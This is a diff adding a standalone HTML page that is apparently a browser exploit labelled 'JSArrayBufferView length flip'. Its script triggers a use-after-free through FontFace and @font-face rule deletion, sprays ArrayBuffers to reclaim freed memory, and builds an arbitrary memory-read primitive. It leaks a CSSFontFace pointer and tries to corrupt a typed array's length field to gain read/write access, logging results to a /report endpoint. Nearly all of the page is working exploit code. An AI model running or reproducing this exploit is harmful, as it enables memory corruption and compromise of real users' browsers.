@@ -1,0 +1,86 @@
+<!doctype html><html><head><meta charset="utf-8"><title>OSNX — length flip</title>
+<style>body{margin:0;padding:16px;background:#07090d;color:#cfe3ff;font-family:system-ui}
+#o{white-space:pre-wrap;font:12px/1.4 ui-monospace,monospace;color:#9fb4d6}</style></head><body>
+<h2 style="font-size:16px;color:#e8b44a">OSNX — JSArrayBufferView length flip</h2>
+<pre id="o">ready.</pre><script>
+var L=[],o=document.getElementById("o");
+function lg(s){o.textContent+=s+"\n";L.push(s);try{fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:L})}).catch(function(){})}catch(e){}}
+var SZ=0xb8,OFF_FS=0x28,OFF_FSZ=0x30,OFF_FSC=0x34,OFF_ST=0x7a;
+function hx(a,b){return "0x"+("00000000"+(b>>>0).toString(16)).slice(-8)+("00000000"+(a>>>0).toString(16)).slice(-8)}
+function ok(a,b){return b<=0xffff&&a%8===0&&(b!==0||a>=0x10000)}
+function add64(a,b,d){var l=(a>>>0)+d,h=(b>>>0)+((l>0xffffffff)?1:0);return {lo:l>>>0,hi:h>>>0}}
+
+async function uaf(){
+  var n=0xb0,ab=[],ft=null,fa=null,st=document.createElement("style");
+  var r1="@font-face{font-family:s;src:local(systemfont);unicode-range:U+0043}";
+  var r2="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042}";
+  var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+  document.fonts.add(A);void A.loaded;document.head.append(st);
+  for(var i=0;i<n/4;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+  var u=st.sheet.cssRules.length;st.sheet.insertRule(r2,st.sheet.cssRules.length);
+  for(var i=n/4;i<n;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+  void document.body.offsetHeight;
+  var ot=FontFace.prototype.then;
+  Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+    if(this!==A)return;st.sheet.deleteRule(u);void document.body.offsetHeight;
+    for(var i=st.sheet.cssRules.length-1;i>=0;i--){if(st.sheet.cssRules[i].cssText.indexOf("s;")>=0||st.sheet.cssRules[i].cssText.indexOf("spray")>=0)st.sheet.deleteRule(i)}
+    void document.body.offsetHeight;
+    for(var i=0;i<n;i++){var b=new ArrayBuffer(SZ),d=new DataView(b);d.setUint32(8,1,true);d.setUint8(OFF_ST,3);ab.push(b)}
+    return undefined}});
+  var fs=null;try{fs=await document.fonts.load("1em a,b","AB")}catch(e){}
+  Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
+  if(!fs||fs.length!==2)return null;
+  for(var i=0;i<fs.length;i++)if(fs[i].unicodeRange==="U+0-10FFFF")ft=fs[i];
+  for(var i=0;i<ab.length;i++)if(new DataView(ab[i]).getUint32(8,true)===2)fa=ab[i];
+  if(!ft||!fa)return null;
+  var d=new DataView(fa);
+  function sp(o2,a,b){d.setUint32(o2,a>>>0,true);d.setUint32(o2+4,b>>>0,true)}
+  function rd(a,b,sz){var r=new ArrayBuffer(sz),v=new Uint8Array(r),i=0;while(i<sz){sp(OFF_FS,(a+i)>>>0,b);d.setInt32(OFF_FSZ,1,true);d.setInt32(OFF_FSC,1,true);var s=ft.featureSettings;for(var j=1;j<5&&i<sz;j++)v[i++]=s.charCodeAt(j)&255}return v}
+  return {f:ft,rd:rd,ab:fa,dv:d};
+}
+
+(async function(){
+  lg("LENGTH FLIP "+navigator.userAgent);
+  var u=await uaf(); if(!u){lg("no primitive");return;}
+  lg("[uaf] ok");
+  var d=u.dv;
+  var wp=d.getUint32(0x60,true),wh=d.getUint32(0x64,true);
+  var w=u.rd(wp,wh,32);
+  var face={lo:(w[8]|w[9]<<8|w[10]<<16|w[11]<<24)>>>0,hi:(w[12]|w[13]<<8|w[14]<<16|w[15]<<24)>>>0};
+  var bb=u.rd(face.lo,face.hi,0x40);
+  var back={lo:(bb[0x30]|bb[0x31]<<8|bb[0x32]<<16|bb[0x33]<<24)>>>0,hi:(bb[0x34]|bb[0x35]<<8|bb[0x36]<<16|bb[0x37]<<24)>>>0};
+  lg("[leak] CSSFontFace="+hx(back.lo,back.hi));
+  var v=new Uint32Array(8); v[0]=0x41414141;v[1]=0x42424242;v[2]=0x43434343;v[3]=0x44444444;
+  lg("[victim] Uint32Array(8) length="+v.length);
+  // find backing store
+  var start={lo:back.lo & 0xfffff000,hi:back.hi},found=null;
+  for(var off=0;off<0x8000&&!found;off+=0x100){
+    var a=add64(start.lo,start.hi,off),b;
+    try{b=u.rd(a.lo,a.hi,0x100)}catch(e){continue}
+    var bd=new DataView(b.buffer||new Uint8Array(b).buffer);
+    for(var i=0;i+16<=b.length;i+=4)if(bd.getUint32(i,true)===0x41414141&&bd.getUint32(i+4,true)===0x42424242){found=add64(a.lo,a.hi,i);break}
+  }
+  if(!found){lg("[victim] marker not found");lg("done");return}
+  lg("[victim] backing="+hx(found.lo,found.hi));
+  // JSArrayBufferView header sits near the backing; scan backwards for the
+  // structure/length pattern: u32 length==8 somewhere before the vector
+  function tryFlip(candLo,candHi,label){
+    var lenAddr=add64(candLo,candHi,0);
+    d.setUint32(0x58,(lenAddr.lo-0x10)>>>0,true);
+    d.setUint32(0x5c,lenAddr.hi>>>0,true);
+    try{document.fonts.delete(u.f)}catch(e){}
+    lg("[flip] "+label+" tried at "+hx(lenAddr.lo,lenAddr.hi));
+  }
+  // candidate offsets behind the backing store
+  var offs=[0x18,0x20,0x28,0x30,0x38,0x40];
+  for(var i=0;i<offs.length;i++){
+    var c=add64(found.lo,found.hi,-offs[i]);
+    if(!ok(c.lo,c.hi))continue;
+    var probe=u.rd(c.lo,c.hi,0x10);
+    var pd=new DataView(probe.buffer||new Uint8Array(probe).buffer);
+    lg("[cand] -0x"+offs[i].toString(16)+" = "+hx(c.lo,c.hi)+"  u32[0]="+pd.getUint32(0,true)+" u32[4]="+pd.getUint32(4,true));
+  }
+  lg("[arw] choose a candidate whose u32 equals 8 (length) and rerun with it");
+  lg("done");
+})();
+</script></body></html>
